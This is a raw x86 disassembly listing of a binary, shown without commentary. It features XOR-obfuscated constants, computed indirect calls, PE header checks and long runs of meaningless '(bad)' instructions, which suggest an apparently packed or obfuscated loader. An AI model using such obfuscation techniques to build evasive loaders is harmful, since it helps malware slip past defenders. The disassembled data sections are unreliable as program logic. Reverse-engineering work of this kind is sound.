  40a06d:	call   0x40834f
  40a072:	test   eax,eax
  40a074:	je     0x40a0a5
  40a07a:	lea    eax,[ebp-0x10c]
  40a080:	push   eax
  40a081:	mov    eax,DWORD PTR [ebp-0x4]
  40a084:	xor    eax,esi
  40a086:	add    eax,ebx
  40a088:	push   eax
  40a089:	mov    eax,DWORD PTR [ebp+0x10]
  40a08c:	add    eax,0xaa
  40a091:	push   eax
  40a092:	mov    eax,DWORD PTR [ebp+0x10]
  40a095:	mov    eax,DWORD PTR [eax+0x198]
  40a09b:	push   DWORD PTR [eax]
  40a09d:	call   0x40b2c8
  40a0a2:	mov    DWORD PTR [ebp-0x24],eax
  40a0a5:	cmp    DWORD PTR [ebp-0x24],0x0
  40a0a9:	lea    edi,[ebp+0x4]
  40a0ac:	mov    DWORD PTR [ebp-0x7c],edi
  40a0af:	je     0x40a179
  40a0b5:	lea    eax,[ebp-0x38]
  40a0b8:	push   eax
  40a0b9:	mov    eax,DWORD PTR [ebp-0x78]
  40a0bc:	xor    eax,esi
  40a0be:	add    eax,ebx
  40a0c0:	push   eax
  40a0c1:	mov    eax,DWORD PTR [ebp-0x48]
  40a0c4:	xor    eax,esi
  40a0c6:	add    eax,ebx
  40a0c8:	push   eax
  40a0c9:	push   DWORD PTR [ebp-0x24]
  40a0cc:	lea    eax,[ebp-0x10c]
  40a0d2:	push   eax
  40a0d3:	push   DWORD PTR [ebp+0xc]
  40a0d6:	push   DWORD PTR [ebp-0x4]
  40a0d9:	call   0x408a84
  40a0de:	test   eax,eax
  40a0e0:	je     0x40a10e
  40a0e6:	lea    eax,[ebp-0x10c]
  40a0ec:	push   eax
  40a0ed:	mov    eax,DWORD PTR [ebp-0x4]
  40a0f0:	xor    eax,esi
  40a0f2:	add    eax,ebx
  40a0f4:	push   eax
  40a0f5:	mov    eax,DWORD PTR [ebp+0x10]
  40a0f8:	add    eax,0xee
  40a0fd:	push   eax
  40a0fe:	mov    eax,DWORD PTR [ebp+0x10]
  40a101:	mov    eax,DWORD PTR [eax+0x198]
  40a107:	push   DWORD PTR [eax]
  40a109:	call   0x40b2c8
  40a10e:	mov    ecx,DWORD PTR [ebp-0x48]
  40a111:	xor    ecx,esi
  40a113:	mov    eax,0xffcd8d63
  40a118:	sub    eax,ecx
  40a11a:	sub    eax,DWORD PTR [ebp-0x24]
  40a11d:	mov    ecx,DWORD PTR [ebp-0x68]
  40a120:	add    ecx,eax
  40a122:	mov    eax,DWORD PTR [ebp-0x24]
  40a125:	mov    DWORD PTR [eax+0x1],ecx
  40a128:	mov    al,BYTE PTR [ebp-0x29]
  40a12b:	mov    ecx,DWORD PTR [ebp-0x24]
  40a12e:	xor    al,0x48
  40a130:	sub    al,0x36
  40a132:	mov    BYTE PTR [ecx],al
  40a134:	lea    eax,[ebp-0x24]
  40a137:	inc    BYTE PTR [eax]
  40a139:	inc    eax
  40a13a:	push   eax
  40a13b:	pop    ecx
  40a13c:	dec    ecx
  40a13d:	xchg   ecx,edx
  40a13f:	dec    BYTE PTR [edx]
  40a141:	push   DWORD PTR [ebp+0x10]
  40a144:	mov    eax,ds:0x412264
  40a149:	mov    eax,DWORD PTR [eax]
  40a14b:	push   DWORD PTR [eax]
  40a14d:	lea    eax,ds:0x412280
  40a153:	push   DWORD PTR [eax]
  40a155:	lea    eax,ds:0x41202c
  40a15b:	push   DWORD PTR [eax]
  40a15d:	lea    eax,ds:0x412260
  40a163:	push   DWORD PTR [eax]
  40a165:	lea    eax,ds:0x41237c
  40a16b:	push   DWORD PTR [eax]
  40a16d:	xchg   ebx,edx
  40a16f:	inc    ebx
  40a170:	inc    ebx
  40a171:	sub    ebx,0x3
  40a174:	push   ebx
  40a175:	pop    eax
  40a176:	call   DWORD PTR [eax+0x1]
  40a179:	mov    DWORD PTR [ebp-0x6c],edi
  40a17c:	mov    eax,DWORD PTR [ebp-0x3c]
  40a17f:	mov    eax,DWORD PTR [ebp-0x18]
  40a182:	push   DWORD PTR [ebp-0x20]
  40a185:	lea    eax,[ebp-0x6c]
  40a188:	push   eax
  40a189:	call   0x406433
  40a18e:	mov    eax,ds:0x4121a8
  40a193:	push   0x4
  40a195:	add    eax,0x1cc
  40a19a:	push   eax
  40a19b:	lea    eax,[ebp-0x3c]
  40a19e:	push   eax
  40a19f:	call   0x4052e7
  40a1a4:	mov    eax,DWORD PTR [ebp-0x3c]
  40a1a7:	mov    eax,DWORD PTR [eax]
  40a1a9:	pop    edi
  40a1aa:	pop    esi
  40a1ab:	pop    ebx
  40a1ac:	leave  
  40a1ad:	ret    0xc
  40a1b0:	push   ebp
  40a1b1:	mov    ebp,esp
  40a1b3:	sub    esp,0x20
  40a1b6:	leave  
  40a1b7:	ret    0x4
  40a1ba:	push   ebp
  40a1bb:	mov    ebp,esp
  40a1bd:	push   ecx
  40a1be:	and    DWORD PTR ds:0x4306d6,edx
  40a1c4:	mov    DWORD PTR [ebp-0x4],0xf89c8535
  40a1cb:	mov    eax,DWORD PTR [ebp+0x8]
  40a1ce:	or     DWORD PTR ds:0x42efb0,0x4306d2
  40a1d8:	mov    al,BYTE PTR [eax]
  40a1da:	adc    DWORD PTR ds:0x42ef90,0x639e
  40a1e4:	add    al,0x36
  40a1e6:	sbb    DWORD PTR ds:0x430622,0x596d
  40a1f0:	xor    al,0x48
  40a1f2:	mov    DWORD PTR ds:0x4306ce,0x7356
  40a1fc:	cmp    al,0xcb
  40a1fe:	mov    DWORD PTR ds:0x430632,0x64e0
  40a208:	jne    0x40a51c
  40a20e:	xor    DWORD PTR ds:0x430636,0x7c62
  40a218:	jmp    0x40a496
  40a21d:	lods   al,BYTE PTR ds:[esi]
  40a21e:	inc    edx
  40a21f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a220:	es jge 0x40a21c
  40a223:	lods   eax,DWORD PTR ds:[esi]
  40a224:	inc    esp
  40a225:	pop    ecx
  40a226:	push   cs
  40a227:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a228:	mov    ds:0xc1ac0e1c,eax
  40a22d:	rcl    esi,cl
  40a22f:	jle    0x40a2af
  40a231:	fbstp  TBYTE PTR [eax+0x7e]
  40a234:	jle    0x40a1f8
  40a236:	in     al,0xab
  40a238:	cmp    eax,0xddbf6a7f
  40a23d:	mov    ebx,0x550a7791
  40a242:	int3   
  40a243:	inc    esi
  40a244:	dec    edi
  40a245:	pop    esp
  40a246:	(bad)  
  40a247:	ds xchg edx,eax
  40a249:	xchg   ecx,eax
  40a24a:	pop    ebp
  40a24b:	addr16 jne 0x40a280
  40a24e:	shr    BYTE PTR [edx-0x1995c925],1
  40a254:	pop    esi
  40a255:	test   al,0x73
  40a257:	fsub   QWORD PTR [esi-0x25]
  40a25a:	and    BYTE PTR [bp+si-0x22],ch
  40a25e:	sub    al,0x95
  40a260:	lahf   
  40a261:	arpl   WORD PTR [edi-0x2e405e18],si
  40a267:	lods   al,BYTE PTR ds:[esi]
  40a268:	lods   eax,DWORD PTR ds:[esi]
  40a269:	jmp    0x5fb0:0x7d300318
  40a270:	mov    dh,BYTE PTR [ebp-0x55aa936b]
  40a276:	hlt    
  40a277:	test   al,0x75
  40a279:	mov    WORD PTR [edi+ecx*8+0x3e],es
  40a27d:	rol    BYTE PTR [ebx-0x4043f3d7],0xfe
  40a284:	mov    dl,0xcc
  40a286:	xlat   BYTE PTR ds:[ebx]
  40a287:	rcr    BYTE PTR [esi+edi*2],0x7b
  40a28b:	inc    ebx
  40a28c:	fistp  QWORD PTR [esi-0x1c]
  40a28f:	jnp    0x40a293
  40a291:	xchg   edx,eax
  40a292:	mov    esp,0x944fa02b
  40a297:	(bad)  
  40a298:	call   0x1d1e1aa3
  40a29d:	xchg   edx,eax
  40a29e:	ins    DWORD PTR es:[edi],dx
  40a29f:	jo     0x40a2a9
  40a2a1:	into   
  40a2a2:	int3   
  40a2a3:	shl    DWORD PTR [ebx-0x4],0xaa
  40a2a7:	sbb    DWORD PTR [ecx-0x3e7f52d],ecx
  40a2ad:	xor    al,0x34
  40a2af:	xchg   esp,eax
  40a2b0:	adc    al,0x8b
  40a2b2:	dec    edi
  40a2b3:	add    eax,0x57e22930
  40a2b8:	inc    ebx
  40a2b9:	cmc    
  40a2ba:	gs xchg ecx,eax
  40a2bc:	pop    ecx
  40a2bd:	push   edx
  40a2be:	jb     0x40a2b8
  40a2c0:	fnstsw WORD PTR [ecx+0x34caab65]
  40a2c6:	adc    DWORD PTR [eax],ebp
  40a2c8:	add    BYTE PTR [edi],dl
  40a2ca:	sbb    dh,BYTE PTR [edi+0x2f]
  40a2cd:	pop    ds
  40a2ce:	and    cl,BYTE PTR [ebx+esi*4-0x6ece9b41]
  40a2d5:	nop
  40a2d6:	pop    esp
  40a2d7:	sub    DWORD PTR [edi-0x70490fb],edi
  40a2dd:	jge    0x40a272
  40a2df:	inc    esi
  40a2e0:	aas    
  40a2e1:	sar    DWORD PTR [ebp+0x2a],1
  40a2e4:	xor    ebp,eax
  40a2e6:	call   0xba2972a4
  40a2eb:	bnd jbe 0x40a27f
  40a2ee:	out    0xa6,eax
  40a2f0:	les    ebx,FWORD PTR [edi]
  40a2f2:	sbb    DWORD PTR ss:[ecx],0xffffffdb
  40a2f6:	sbb    DWORD PTR [esi],edx
  40a2f8:	pop    es
  40a2f9:	fild   DWORD PTR [ebx+0x64b97f37]
  40a2ff:	das    
  40a300:	in     eax,0x88
  40a302:	rcr    ch,0xa0
  40a305:	int3   
  40a306:	or     al,0x5d
  40a308:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a309:	pushf  
  40a30a:	scas   al,BYTE PTR es:[edi]
  40a30b:	lods   al,BYTE PTR ds:[esi]
  40a30c:	mov    eax,0x2df678a6
  40a311:	inc    eax
  40a312:	popa   
  40a313:	pop    edx
  40a314:	out    0xc4,al
  40a316:	shl    BYTE PTR [esi],1
  40a318:	mov    dh,0xb3
  40a31a:	sub    ch,BYTE PTR [edi+eax*4+0x5]
  40a31e:	mov    al,0xbf
  40a320:	pushf  
  40a321:	sub    al,0xc0
  40a323:	dec    ebx
  40a324:	pop    eax
  40a325:	imul   esi,ebx,0x73
  40a328:	enter  0x8cc4,0x33
  40a32c:	les    esi,FWORD PTR [ecx+0x48]
  40a32f:	or     cl,ah
  40a331:	test   al,0xf0
  40a333:	xchg   esi,eax
  40a334:	add    edx,DWORD PTR [ecx+0x6d]
  40a337:	push   ds
  40a338:	je     0x40a320
  40a33a:	(bad)  
  40a33b:	push   0x73a23055
  40a340:	into   
  40a341:	inc    esp
  40a342:	mov    ecx,DWORD PTR [ecx-0x72043a10]
  40a348:	in     al,dx
  40a349:	push   eax
  40a34a:	xchg   BYTE PTR [eiz*1-0x2cfefd3d],al
  40a351:	push   ebp
  40a352:	pop    edx
  40a353:	repnz mov gs,WORD PTR [edx+0x5a598a8c]
  40a35a:	pop    ecx
  40a35b:	jmp    0x6d38d218
  40a360:	add    BYTE PTR [edi+0x50],0x22
  40a364:	adc    bh,bh
  40a366:	push   esp
  40a367:	jle    0x40a3a9
  40a369:	jb     0x40a342
  40a36b:	dec    esp
  40a36c:	dec    ecx
  40a36d:	adc    BYTE PTR [eax],dh
  40a36f:	js     0x40a32b
  40a371:	push   cs
  40a372:	dec    eax
  40a373:	cmp    esp,esp
  40a375:	pop    ds
  40a376:	push   esi
  40a377:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a378:	adc    DWORD PTR [edi],0x63
  40a37b:	retf   
  40a37c:	(bad)  
  40a37e:	xchg   DWORD PTR [ecx+0x25],esi
  40a381:	cmp    bh,BYTE PTR [ecx]
  40a383:	scas   al,BYTE PTR es:[edi]
  40a384:	dec    esi
  40a385:	ret    0xb442
  40a388:	fcmove st,st(1)
  40a38a:	bound  esp,QWORD PTR ds:0x8171642b
  40a390:	leave  
  40a391:	xchg   esp,eax
  40a392:	inc    eax
  40a393:	pop    es
  40a394:	jmp    0xf07e4974
  40a399:	jno    0x40a359
  40a39b:	fidiv  DWORD PTR [edx+0x4e]
  40a39e:	sti    
  40a39f:	popw   ds
  40a3a1:	sbb    bl,BYTE PTR [esi-0x56]
  40a3a4:	icebp  
  40a3a5:	loop   0x40a3ab
  40a3a7:	xor    ah,BYTE PTR [ebp-0x7f]
  40a3aa:	add    dh,dh
  40a3ac:	dec    ecx
  40a3ad:	stos   DWORD PTR es:[edi],eax
  40a3ae:	cmp    dh,ah
  40a3b0:	cmp    DWORD PTR [esi],0x69700cdf
  40a3b6:	mov    ds:0x1a6cb0f5,eax
  40a3bb:	in     al,dx
  40a3bc:	xchg   edi,eax
  40a3bd:	test   al,0x4b
  40a3c0:	add    ch,BYTE PTR [eax+edx*1+0x2f]
  40a3c4:	push   cs
  40a3c5:	in     al,0x20
  40a3c7:	js     0x40a3e3
  40a3c9:	jmp    0x40a3ce
  40a3cb:	pop    edi
  40a3cc:	xchg   BYTE PTR [esi],cl
  40a3ce:	ins    BYTE PTR es:[edi],dx
  40a3cf:	ss scas eax,DWORD PTR es:[edi]
  40a3d1:	ror    dl,1
  40a3d3:	scas   eax,DWORD PTR es:[edi]
  40a3d4:	jnp    0x40a41b
  40a3d6:	out    0x1d,al
  40a3d8:	pushf  
  40a3d9:	(bad)  
  40a3da:	(bad)  
  40a3db:	jecxz  0x40a423
  40a3dd:	mov    al,ds:0xdf937005
  40a3e2:	adc    DWORD PTR [edi+eiz*8-0x7c135dfa],ebp
  40a3e9:	(bad)  
  40a3ea:	jmp    0x40a3b3
  40a3ec:	dec    eax
  40a3ed:	or     DWORD PTR [esi+0x686b8608],0x0
  40a3f4:	outs   dx,DWORD PTR ds:[esi]
  40a3f5:	test   bh,al
  40a3f7:	test   al,0x47
  40a3f9:	repz fnstcw WORD PTR [edi+0x4c]
  40a3fd:	or     edi,ebp
  40a3ff:	jb     0x40a44f
  40a401:	rcr    dh,0x28
  40a404:	push   eax
  40a405:	xor    ebp,DWORD PTR [eax]
  40a407:	sbb    al,0xb4
  40a409:	mov    ebx,0x8c580f4b
  40a40e:	(bad)  
  40a40f:	shr    DWORD PTR [eax-0x14e0daf8],1
  40a415:	inc    esp
  40a416:	add    DWORD PTR [eax+0x5be150b3],esp
  40a41c:	or     dl,BYTE PTR [edx+0x25487c02]
  40a422:	adc    al,0x4a
  40a424:	aaa    
  40a425:	test   eax,0xc2923d5e
  40a42a:	ret    
  40a42b:	dec    edi
  40a42c:	retf   
  40a42d:	sub    BYTE PTR [ebx+0xcc265b0],dl
  40a433:	es sub al,0x3f
  40a436:	mov    al,ss:0x1fcb1e4b
  40a43c:	mov    cl,0xc5
  40a43e:	test   DWORD PTR [edi+0x21],esp
  40a441:	pop    eax
  40a442:	adc    BYTE PTR [edx+0x2b65d396],ch
  40a448:	popf   
  40a449:	iret   
  40a44a:	(bad)  [ecx+0x3851b47]
  40a450:	ret    
  40a451:	xchg   DWORD PTR [esi+0x2d],ecx
  40a454:	out    dx,al
  40a455:	dec    ebx
  40a456:	(bad)  
  40a457:	loope  0x40a48f
  40a459:	inc    edx
  40a45a:	call   0x9a97:0xcf8ee46c
  40a461:	mov    edi,0xc362857c
  40a466:	adc    al,0x98
  40a468:	sti    
  40a469:	leave  
  40a46a:	lods   eax,DWORD PTR ds:[esi]
  40a46b:	jecxz  0x40a4e8
  40a46d:	dec    edx
  40a46e:	jo     0x40a4b9
  40a470:	adc    eax,0x93b67478
  40a475:	or     eax,0xc41a8740
  40a47a:	lahf   
  40a47b:	push   esi
  40a47c:	adc    dh,ch
  40a47e:	in     al,0x1b
  40a480:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a481:	call   0x63f4f0f7
  40a486:	add    ah,BYTE PTR [ecx+0x3bb0108c]
  40a48c:	es push esp
  40a48e:	(bad)  
  40a490:	add    DWORD PTR cs:[esi],esp
  40a493:	pop    ds
  40a494:	ds jg  0x40a422
  40a497:	inc    ebp
  40a498:	or     bh,al
  40a49a:	add    eax,0x4306c2
  40a49f:	pop    ss
  40a4a0:	add    BYTE PTR [eax],al
  40a4a2:	add    BYTE PTR [ebx+0x4306c23d],al
  40a4a8:	add    BYTE PTR [eax],al
  40a4aa:	je     0x40a4d8
  40a4b0:	cmp    DWORD PTR ds:0x4306c2,0x24
  40a4b7:	jne    0x40a4c6
  40a4bd:	push   DWORD PTR [ebp-0x28]
  40a4c0:	call   DWORD PTR ds:0x42ec64
  40a4c6:	mov    ecx,DWORD PTR ds:0x4306c2
  40a4cc:	dec    ecx
  40a4cd:	mov    DWORD PTR ds:0x4306c2,ecx
  40a4d3:	jmp    0x40a4a3
  40a4d8:	mov    ecx,DWORD PTR [ebp+0x8]
  40a4db:	sub    edx,0x356a
  40a4e1:	add    ecx,DWORD PTR [eax+0x3c]
  40a4e4:	and    eax,edx
  40a4e6:	mov    edx,0x7510856
  40a4eb:	mov    DWORD PTR [ebp+0x8],ecx
  40a4ee:	mov    eax,DWORD PTR [ebp-0x4]
  40a4f1:	xor    eax,edx
  40a4f3:	push   esi
  40a4f4:	mov    esi,DWORD PTR [ebp+0x8]
  40a4f7:	mov    ecx,0x32729d
  40a4fc:	add    eax,ecx
  40a4fe:	cmp    DWORD PTR [esi+0x54],eax
  40a501:	pop    esi
  40a502:	je     0x40a510
  40a508:	mov    eax,DWORD PTR [ebp+0x8]
  40a50b:	jmp    0x40a7a7
  40a510:	mov    eax,DWORD PTR [ebp-0x4]
  40a513:	xor    eax,edx
  40a515:	add    eax,ecx
  40a517:	jmp    0x40a7a7
  40a51c:	mov    eax,DWORD PTR [ebp-0x4]
  40a51f:	xor    eax,0x7510856
  40a524:	jmp    0x40a7a2
  40a529:	mov    esi,edi
  40a52b:	pop    ds
  40a52c:	outs   dx,BYTE PTR ds:[esi]
  40a52d:	adc    esp,DWORD PTR [esi+0x5b]
  40a530:	jnp    0x40a586
  40a532:	xor    eax,0x493ba360
  40a537:	inc    ecx
  40a538:	or     DWORD PTR [eax+ebp*8+0x70df7e7e],esi
  40a53f:	jle    0x40a5bf
  40a541:	das    
  40a542:	push   es
  40a543:	hlt    
  40a544:	fcomp  DWORD PTR [eax+edi*1+0x4c5beab0]
  40a54b:	sub    eax,0x6d6dd6cb
  40a550:	add    eax,DWORD PTR [ecx-0x4ee05bac]
  40a556:	push   ebx
  40a557:	adc    al,0xb
  40a559:	inc    ebx
  40a55a:	lea    esi,[edx]
  40a55c:	add    eax,0xcd769dde
  40a561:	add    al,0x4b
  40a563:	or     al,BYTE PTR [edx-0x46]
  40a566:	mov    ch,0x28
  40a568:	mov    esi,0x81db2afc
  40a56d:	add    eax,0xc3ae0245
  40a572:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a573:	inc    esi
  40a574:	xor    al,0x8e
  40a576:	and    BYTE PTR [ecx+0x76d53ee5],ch
  40a57c:	pop    ebx
  40a57d:	cs jp  0x40a596
  40a580:	rcl    esi,1
  40a582:	fnstsw WORD PTR [esi-0x6a]
  40a585:	sti    
  40a586:	mov    dl,0x1
  40a588:	xchg   ebx,eax
  40a589:	(bad)  
  40a58a:	xchg   edi,eax
  40a58b:	dec    esi
  40a58c:	js     0x40a5b6
  40a58e:	sub    cl,BYTE PTR [esi-0x29e7c804]
  40a594:	xor    al,0x6a
  40a596:	sub    eax,0xdf14eef6
  40a59b:	(bad)  
  40a59c:	cs jge 0x40a53e
  40a59f:	jle    0x40a5ed
  40a5a1:	cmp    dl,ah
  40a5a3:	fwait
  40a5a4:	jne    0x40a5ec
  40a5a6:	aam    0xd7
  40a5a8:	push   ecx
  40a5a9:	xchg   ecx,edx
  40a5ab:	dec    esi
  40a5ac:	cmp    DWORD PTR [eax+0x4e],ebx
  40a5af:	pop    eax
  40a5b0:	xor    esi,DWORD PTR [esi+eax*4+0x76]
  40a5b4:	ins    BYTE PTR es:[edi],dx
  40a5b5:	add    al,BYTE PTR [esi+edi*8]
  40a5b8:	loop   0x40a583
  40a5ba:	xchg   ebx,eax
  40a5bb:	and    esp,DWORD PTR [edi]
  40a5bd:	sbb    ecx,DWORD PTR [ebx-0xe1a83c9]
  40a5c3:	addr16 in al,dx
  40a5c5:	dec    ecx
  40a5c6:	add    al,0x71
  40a5c8:	mov    ecx,0x4656c387
  40a5cd:	out    0x52,eax
  40a5cf:	push   ds
  40a5d0:	addr16 xchg edx,eax
  40a5d2:	fiadd  DWORD PTR [edx-0x21db9589]
  40a5d8:	daa    
  40a5d9:	cmc    
  40a5da:	fsubr  QWORD PTR [ebp-0x30]
  40a5dd:	mov    al,0xc2
  40a5df:	or     BYTE PTR [eax-0x52],cl
  40a5e2:	pusha  
  40a5e3:	test   cl,0xf3
  40a5e6:	mov    edi,ebp
  40a5e8:	adc    cl,dl
  40a5ea:	clc    
  40a5eb:	cdq    
  40a5ec:	clc    
  40a5ed:	mov    DWORD PTR [eax-0x7f],0xb377a86a
  40a5f4:	aam    0x2e
  40a5f6:	rol    DWORD PTR [eax-0x4f908dae],0xd8
  40a5fd:	xchg   esp,eax
  40a5fe:	or     edi,edx
  40a600:	jae    0x40a679
  40a602:	retf   
  40a603:	xchg   ebp,eax
  40a604:	(bad)  
  40a605:	int    0xe6
  40a607:	imul   ebp,DWORD PTR [ecx-0x3],0xabbc5859
  40a60e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a60f:	and    BYTE PTR [esi-0x6c],dl
  40a612:	in     al,0xfe
  40a614:	sbb    BYTE PTR [edx],0xfd
  40a617:	imul   ebp,DWORD PTR [ecx-0x34],0xaccc963d
  40a61e:	mul    BYTE PTR [edx-0x27]
  40a621:	xchg   esp,eax
  40a622:	sub    esi,eax
  40a624:	pop    es
  40a625:	inc    esp
  40a626:	xchg   BYTE PTR [ebp-0x92567ad],dl
  40a62c:	repz push esp
  40a62e:	mov    dl,0xf
  40a630:	shl    DWORD PTR [edx],1
  40a632:	add    BYTE PTR [edx+0x69e54f66],cl
  40a638:	rol    BYTE PTR [eax+0x79c558bf],cl
  40a63e:	jno    0x40a691
  40a640:	in     eax,0x81
  40a642:	sahf   
  40a643:	and    ebp,DWORD PTR [esi]
  40a645:	mov    dl,0x74
  40a647:	fwait
  40a648:	adc    BYTE PTR [ebx+0x26],ch
  40a64b:	and    eax,ebp
  40a64d:	retf   
  40a64e:	jae    0x40a5f2
  40a650:	adc    al,0x37
  40a652:	pop    eax
  40a653:	fs and ah,cl
  40a656:	leave  
  40a657:	mov    WORD PTR [ebp-0x47b4cf8],cs
  40a65d:	loopne 0x40a678
  40a65f:	sti    
  40a660:	arpl   WORD PTR [ebp+0x5ad7d54b],bp
  40a666:	push   ds
  40a667:	add    cl,BYTE PTR [esi+0xf395e16]
  40a66d:	ins    DWORD PTR es:[edi],dx
  40a66e:	leave  
  40a66f:	cwde   
  40a670:	and    DWORD PTR [edx-0xe6ec4f4],esp
  40a676:	dec    ebp
  40a677:	(bad)  
  40a678:	(bad)  [ecx+0x6d]
  40a67b:	fidivr DWORD PTR [esi]
  40a67d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a67e:	pop    ebx
  40a67f:	inc    edx
  40a680:	pushf  
  40a681:	loopne 0x40a642
  40a683:	pusha  
  40a684:	out    0x5d,al
  40a686:	adc    al,0xec
  40a688:	cmp    edi,DWORD PTR [esi]
  40a68a:	cmc    
  40a68b:	sar    DWORD PTR ds:0xdbfe1ab2,0x81
  40a692:	push   ebp
  40a693:	mov    al,0xfe
  40a695:	push   es
  40a696:	outs   dx,DWORD PTR ds:[esi]
  40a697:	and    ah,dl
  40a699:	and    BYTE PTR [edx+0x3822aa2b],al
  40a69f:	fisttp WORD PTR [edx]
  40a6a1:	mov    DWORD PTR [ebx-0x31],edi
  40a6a4:	xor    edi,ebx
  40a6a6:	mov    al,BYTE PTR [eax+0x51]
  40a6a9:	in     eax,0x77
  40a6ab:	cmp    DWORD PTR [eax-0x15283101],esi
  40a6b1:	daa    
  40a6b2:	scas   eax,DWORD PTR es:[edi]
  40a6b3:	or     eax,0xebaff49c
  40a6b8:	aaa    
  40a6b9:	mov    DWORD PTR [esi-0x17],edx
  40a6bc:	mov    cl,0x22
  40a6be:	retf   0xf18b
  40a6c1:	fdivr  DWORD PTR [edx]
  40a6c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a6c4:	mov    ds:0x1edd275,eax
  40a6c9:	and    al,0x57
  40a6cb:	mov    ds:0xfb5401a9,al
  40a6d0:	ins    BYTE PTR es:[edi],dx
  40a6d1:	mov    eax,0x6235c849
  40a6d6:	imul   ebx,DWORD PTR [esi],0x916c0bfb
  40a6dc:	inc    esi
  40a6dd:	sti    
  40a6de:	add    DWORD PTR [ecx+esi*2+0x1e],ebp
  40a6e2:	cmp    ebp,ebx
  40a6e4:	push   ecx
  40a6e5:	shl    DWORD PTR [edi-0xd869db4],1
  40a6eb:	push   ebp
  40a6ec:	test   DWORD PTR [esi+0x69],edi
  40a6ef:	jge    0x40a70e
  40a6f1:	repz shl DWORD PTR [ebp-0x5],1
  40a6f5:	and    al,0x10
  40a6f7:	cmp    BYTE PTR ss:[esi],ch
  40a6fa:	cld    
  40a6fb:	or     ecx,DWORD PTR [edx+0x3b1c31a7]
  40a701:	push   edx
  40a702:	mov    eax,ds:0x721b7362
  40a707:	mov    BYTE PTR [esi],ah
  40a709:	(bad)  
  40a70a:	push   esp
  40a70b:	mov    WORD PTR [ebp+0xf352609],?
  40a711:	push   esi
  40a712:	cli    
  40a713:	and    edx,DWORD PTR [ebx]
  40a715:	pop    edi
  40a716:	jmp    0x40a6db
  40a718:	and    DWORD PTR [eax-0x36],edi
  40a71b:	pop    esi
  40a71c:	push   esi
  40a71d:	push   0x77
  40a71f:	push   eax
  40a720:	adc    BYTE PTR [ebp+0x38f50437],bl
  40a726:	lea    esp,[ecx-0x3f129b8]
  40a72c:	bound  esi,QWORD PTR [edx-0x14]
  40a72f:	aas    
  40a730:	retf   
  40a731:	ja     0x40a6e9
  40a733:	pop    esi
  40a734:	icebp  
  40a735:	add    esi,DWORD PTR [ebx+ebp*8-0x76]
  40a739:	mov    esi,edx
  40a73b:	gs retf 0xa992
  40a73f:	xchg   edx,eax
  40a740:	ror    DWORD PTR [esi],1
  40a742:	lods   eax,DWORD PTR ds:[esi]
  40a743:	out    0xa9,al
  40a745:	mov    ds:0x2ea68e71,eax
  40a74a:	dec    BYTE PTR [edx+0x366b892f]
  40a750:	or     DWORD PTR [edi-0x1f],esi
  40a753:	test   al,0xf6
  40a755:	imul   DWORD PTR [ebx]
  40a757:	mov    edi,DWORD PTR [ebx]
  40a759:	adc    ah,dl
  40a75b:	mov    ds:0x7a390f6f,eax
  40a760:	and    dh,BYTE PTR [esp+esi*4]
  40a763:	jg     0x40a765
  40a765:	mov    bl,0x60
  40a767:	jo     0x40a703
  40a769:	lahf   
  40a76a:	jp     0x40a729
  40a76c:	fwait
  40a76d:	adc    eax,0x12982bba
  40a772:	sub    bh,BYTE PTR [ecx]
  40a774:	ins    DWORD PTR es:[edi],dx
  40a775:	rcl    eax,0xe9
  40a778:	into   
  40a779:	mov    cl,0x29
  40a77b:	stos   DWORD PTR es:[edi],eax
  40a77c:	inc    edi
  40a77d:	aam    0xf0
  40a77f:	shl    BYTE PTR [edi],cl
  40a781:	jmp    0x8567fd59
  40a786:	jnp    0x40a7eb
  40a788:	stc    
  40a789:	outs   dx,BYTE PTR ds:[esi]
  40a78a:	pushf  
  40a78b:	enter  0xf50c,0xa5
  40a78f:	inc    eax
  40a790:	add    bl,0xe
  40a793:	std    
  40a794:	aam    0x2b
  40a796:	and    eax,DWORD PTR [ebx-0x4d]
  40a799:	inc    eax
  40a79a:	mov    eax,ds:0x218b2ce
  40a79f:	cli    
  40a7a0:	test   eax,0x729d053c
  40a7a5:	xor    al,BYTE PTR [eax]
  40a7a7:	leave  
  40a7a8:	ret    0x4
  40a7ab:	push   ebp
  40a7ac:	mov    ebp,esp
  40a7ae:	push   ecx
  40a7af:	inc    eax
  40a7b0:	push   ecx
  40a7b1:	and    DWORD PTR ds:0x43061e,0x0
  40a7bb:	jmp    0x40a7cb
  40a7c0:	mov    eax,ds:0x43061e
  40a7c5:	inc    eax
  40a7c6:	mov    ds:0x43061e,eax
  40a7cb:	cmp    DWORD PTR ds:0x43061e,0x10
  40a7d2:	jae    0x40a821
  40a7d8:	cmp    DWORD PTR ds:0x43061e,0x9
  40a7df:	jne    0x40a7f1
  40a7e5:	push   DWORD PTR [ebp-0x24]
  40a7e8:	push   DWORD PTR [ebp-0x10]
  40a7eb:	call   DWORD PTR ds:0x42ed50
  40a7f1:	cmp    DWORD PTR ds:0x43061e,0x8
  40a7f8:	jne    0x40a809
  40a7fe:	mov    eax,ds:0x43061e
  40a803:	inc    eax
  40a804:	mov    ds:0x43061e,eax
  40a809:	jmp    0x40a7c0
  40a80e:	mov    ecx,DWORD PTR ds:0x430652
  40a814:	xor    edx,edx
  40a816:	add    edx,DWORD PTR ds:0x430656
  40a81c:	sub    ecx,edx
  40a81e:	xor    ecx,DWORD PTR [ecx+edx*1]
  40a821:	mov    DWORD PTR [ebp-0x8],0xf89c8535
  40a828:	sbb    ecx,0x259c
  40a82e:	jmp    0x40aa29
  40a833:	imul   ebp,ecx,0x7a81ca81
  40a839:	jge    0x40a8a8
  40a83b:	dec    esp
  40a83c:	jb     0x40a8a1
  40a83e:	jmp    0x40a7ce
  40a840:	mov    bl,0x85
  40a842:	ficom  DWORD PTR ds:0x5c7e7eeb
  40a848:	jg     0x40a8c8
  40a84a:	jle    0x40a844
  40a84c:	cmc    
  40a84d:	push   0xffffff91
  40a84f:	inc    ebx
  40a850:	xchg   ecx,eax
  40a851:	loope  0x40a8d0
  40a853:	out    0x57,al
  40a855:	sub    al,0x76
